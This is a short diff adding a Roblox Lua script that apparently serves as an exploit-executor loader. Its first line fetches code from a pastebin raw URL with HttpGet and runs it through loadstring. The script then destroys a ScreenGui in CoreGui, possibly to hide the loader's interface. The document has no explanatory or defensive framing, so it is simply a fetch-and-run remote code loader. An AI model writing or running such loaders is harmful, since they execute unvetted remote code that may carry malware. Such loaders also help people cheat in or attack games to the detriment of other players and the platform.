@@ -1,0 +1,7 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/XXPTpkcZ", true))()
+
+wait()
+local ui = game:GetService("CoreGui"):FindFirstChild("ScreenGui")
+if ui then
+    ui:Destroy()
+end
